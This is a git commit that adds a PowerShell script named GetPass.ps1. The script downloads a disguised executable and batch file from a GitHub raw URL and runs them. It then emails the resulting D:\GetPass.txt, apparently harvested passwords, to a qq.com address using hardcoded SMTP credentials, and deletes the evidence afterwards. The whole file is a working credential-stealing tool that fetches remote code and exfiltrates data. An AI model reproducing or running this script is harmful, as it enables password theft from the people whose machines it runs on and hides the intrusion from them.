af8f3c92910c8193f23c6916726dd3d87d9dea08
KillTimeSummer <u223110@outlook.com>
2017-10-21 14:22:57 +0800

    Add files via upload

---
+++ GetPass.ps1
@@ -0,0 +1,31 @@
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KillTimeSummer/clopro/master/GetPass.rar','D:\Get.exe');
+
+(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/KillTimeSummer/clopro/master/Command.rar','D:\Command.bat');
+
+D:\Command.bat;
+$SMTPServer = 'smtp.qq.com'
+
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+
+$SMTPInfo.EnableSsl = $true 
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('2736984735@qq.com', 'u223110');
+
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+
+$ReportEmail.From = '2736984735@qq.com'
+
+$ReportEmail.To.Add('2736984735@qq.com')
+
+$ReportEmail.Subject = 'GetPass'
+
+$ReportEmail.Body = 'GetPass_text'  
+
+$ReportEmail.Attachments.Add('D:\GetPass.txt')
+$SMTPInfo.Timeout = 1000000
+$SMTPInfo.Send($ReportEmail)
+$ReportEmail.Attachments.Dispose()
+
+remove-item 'D:\GetPass.txt'
+
+remove-item 'D:\Get.exe'
